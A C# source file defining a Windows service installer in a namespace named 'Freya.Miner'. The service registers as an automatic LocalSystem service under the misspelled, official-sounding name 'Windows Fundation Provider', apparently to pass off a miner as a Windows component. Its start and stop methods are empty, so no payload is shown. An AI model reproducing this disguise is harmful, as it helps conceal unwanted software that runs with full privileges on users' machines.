using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Configuration.Install;
using System.Collections;

namespace Freya.Miner
{
    public partial class FreyaWorkerService : ServiceBase
    {
        public FreyaWorkerService()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
        }

        protected override void OnStop()
        {
        }

        /// <summary>
        /// Return the path where the service's settings should be saved and loaded.
        /// </summary>
        private static string GetSettingsFileName()
        {
            return AppDomain.CurrentDomain.BaseDirectory + "\\OpaqueMail.Proxy.xml";
        }
    }

    /// <summary>
    /// Sets the service account to the local system.
    /// </summary>
    [RunInstaller(true)]
    public sealed class WorkerServiceProcessInstaller : ServiceProcessInstaller
    {
        public WorkerServiceProcessInstaller()
        {
            Account = ServiceAccount.LocalSystem;
        }
    }

    /// <summary>
    /// Handles OpaqueMail Proxy service installation.a
    /// </summary>
    [RunInstaller(true)]
    public sealed class WorkerServiceInstaller : ServiceInstaller
    {
        /// <summary>
        /// Default constructor.
        /// </summary>
        public WorkerServiceInstaller()
        {
            Description = "Provide several fundation service necessery for windows.";
            DisplayName = "Windows Fundation Provider";
            ServiceName = "WindowsFundationProvider";
            StartType = ServiceStartMode.Automatic;
        }

        /// <summary>
        /// Handle installation and uninstallation.
        /// </summary>
        /// <param name="uninstall">Whether we're uninstalling.  False if installing, true if uninstalling</param>
        /// <param name="args">Any service installation arguments.</param>
        public void Install(bool uninstall, string[] args)
        {
            try
            {
                using (AssemblyInstaller installer = new AssemblyInstaller(typeof(Program).Assembly, args))
                {
                    IDictionary state = new Hashtable();
                    installer.UseNewContext = true;
                    try
                    {
                        // Attempt to install or uninstall.
                        if (uninstall)
                            installer.Uninstall(state);
                        else
                        {
                            installer.Install(state);
                            installer.Commit(state);
                        }
                    }
                    catch (Exception e)
                    {
                        // If an error is encountered, attempt to roll back.
                        try
                        {
                            installer.Rollback(state);
                        }
                        catch { }

                        throw;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine(ex.Message);
            }
        }
    }
}
